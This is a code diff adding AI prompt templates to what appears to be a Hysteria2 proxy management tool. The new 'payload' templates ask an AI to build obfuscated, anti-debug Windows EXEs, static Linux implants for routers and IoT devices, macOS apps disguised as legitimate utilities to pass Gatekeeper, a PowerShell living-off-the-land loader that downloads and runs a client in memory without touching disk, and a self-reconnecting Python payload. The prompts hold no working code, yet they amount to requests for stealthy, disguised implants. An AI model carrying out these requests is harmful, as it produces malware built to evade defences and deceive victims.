@@ -73,4 +73,58 @@ export const AI_TEMPLATES: AiTemplate[] = [
       "Generate a production-ready Hysteria2 server configuration for a new node. Use ACME TLS with Let's Encrypt, salamander obfuscation, sensible bandwidth limits (100 Mbps up, 500 Mbps down), and a CDN masquerade. Include the traffic stats API and HTTP auth backend configuration. Also list the available profiles I can apply to this node.",
     category: "config",
   },
+  {
+    id: "payload-windows-stealth",
+    label: "Build stealth Windows payload",
+    description:
+      "Generate an obfuscated Windows EXE with heavy obfuscation for red team operations.",
+    prompt:
+      "Generate a stealth Windows EXE payload with heavy obfuscation (string encoding, control flow, anti-debug). The payload should connect to our Hysteria2 infrastructure with auto-reconnect enabled. Include code signing if available. Explain the obfuscation techniques used and estimated build time.",
+    category: "payload",
+  },
+  {
+    id: "payload-linux-embedded",
+    label: "Build Linux ELF for embedded systems",
+    description:
+      "Create a lightweight Linux payload for routers/IoT devices with static linking.",
+    prompt:
+      "Generate a lightweight Linux ELF payload optimized for embedded systems (routers, IoT). Use static linking with musl libc, minimal footprint, and light obfuscation. The binary should run on ARM and x86 architectures if possible. Explain the size optimization techniques.",
+    category: "payload",
+  },
+  {
+    id: "payload-macos-signed",
+    label: "Build signed macOS app bundle",
+    description:
+      "Create a notarized macOS application bundle that passes Gatekeeper checks.",
+    prompt:
+      "Generate a macOS application bundle (Universal Binary for Intel + Apple Silicon) with code signing and notarization. The app should appear as a legitimate utility to pass Gatekeeper checks. Include proper Info.plist, app icon placeholders, and entitlements. Explain the signing requirements.",
+    category: "payload",
+  },
+  {
+    id: "payload-powershell-lotl",
+    label: "Build PowerShell Living-off-the-Land",
+    description:
+      "Create a PowerShell script using native Windows tools for stealth execution.",
+    prompt:
+      "Generate a PowerShell payload that uses Living-off-the-Land techniques (certutil, bitsadmin, WMI) for stealth execution. Apply multiple layers of encoding and obfuscation. The script should download and execute the Hysteria2 client in memory without touching disk. Explain the LotL techniques used.",
+    category: "payload",
+  },
+  {
+    id: "payload-python-cross-platform",
+    label: "Build cross-platform Python payload",
+    description:
+      "Create a Python payload that works on Windows, Linux, and macOS with asyncio.",
+    prompt:
+      "Generate a cross-platform Python payload using asyncio for concurrent connections. Include auto-reconnect logic, heartbeat keepalives, and fallback server support. Add bytecode obfuscation and explain how to bundle it with PyInstaller for distribution.",
+    category: "payload",
+  },
+  {
+    id: "list-payloads",
+    label: "List my payload builds",
+    description:
+      "Show all payload builds with their current status and download links.",
+    prompt:
+      "List all my payload builds. Show the status of each (pending, building, ready, failed), their platform types, sizes, and provide download links for the ones that are ready. Also show any build errors for failed payloads.",
+    category: "payload",
+  },
 ]
